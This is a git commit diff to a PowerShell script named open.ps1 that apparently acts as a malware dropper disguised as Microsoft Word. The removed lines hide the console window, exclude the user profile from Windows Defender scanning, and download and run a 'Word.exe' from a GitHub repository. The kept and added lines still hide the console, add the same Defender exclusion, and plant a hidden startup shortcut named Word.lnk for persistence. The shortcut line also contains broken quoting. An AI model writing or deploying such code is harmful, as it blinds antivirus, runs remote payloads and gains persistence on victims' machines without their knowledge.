5b364bd973ae92ad654c6010e13ac2cdc8531856
MrRoyal1235 <94418680+MrRoyal1235@users.noreply.github.com>
2024-10-05 10:54:46 +0700

    Update open.ps1

--- open.ps1
+++ open.ps1
@@ -8,29 +8,10 @@ public static extern IntPtr GetConsoleWindow();
 [DllImport("user32.dll")]
 public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
 '
-function Hide-Console
-{
-    $consolePtr = [Console.Window]::GetConsoleWindow()
-    #0 hide
-    [Console.Window]::ShowWindow($consolePtr, 0)
-}
-Hide-Console
-Add-MpPreference -ExclusionPath $env:USERPROFILE
-$url = 'https://github.com/MrRoyal1235/checkaccvjppro/raw/main/Word.exe'
-$outputFile = [System.IO.Path]::Combine($env:Temp, 'Word.exe')
-Start-Sleep -Milliseconds 100 
-Invoke-WebRequest -Uri $url -OutFile $outputFile
-Start-Process -FilePath $outputFile
-Add-Type -Name Window -Namespace Console -MemberDefinition '
-[DllImport("Kernel32.dll")]
-public static extern IntPtr GetConsoleWindow();
-[DllImport("user32.dll")]
-public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
-'
 
 function Hide-Console {
     $consolePtr = [Console.Window]::GetConsoleWindow()
-    [Console.Window]::ShowWindow($consolePtr, 0)  # Ẩn cửa sổ console
+    [Console.Window]::ShowWindow($consolePtr, 0)
 }
 
 function Test-InternetConnection {
@@ -45,22 +26,24 @@ function Test-InternetConnection {
 
 function Wait-ForInternet {
     while (-not (Test-InternetConnection)) {
-        Start-Sleep -Seconds 10 
+        Start-Sleep -Seconds 10
     }
 }
 
 function Add-ToStartup {
     $scriptPath = $MyInvocation.MyCommand.Definition
+
     $startupFolder = [System.IO.Path]::Combine($env:AppData, "Microsoft\Windows\Start Menu\Programs\Startup")
 
     $WshShell = New-Object -ComObject WScript.Shell
-    $shortcut = $WshShell.CreateShortcut("$startupFolder\RunMyScript.lnk")
-    $shortcut.TargetPath = "powershell.exe"
-    $shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
+    $shortcut = $WshShell.CreateShortcut("$startupFolder\Word.lnk")
+    $shortcut.TargetPath = "Word.exe"
+    $shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File "$scriptPath""
     $shortcut.Save()
 }
 
 Hide-Console
+
 Add-ToStartup
 
 Add-MpPreference -ExclusionPath $env:USERPROFILE
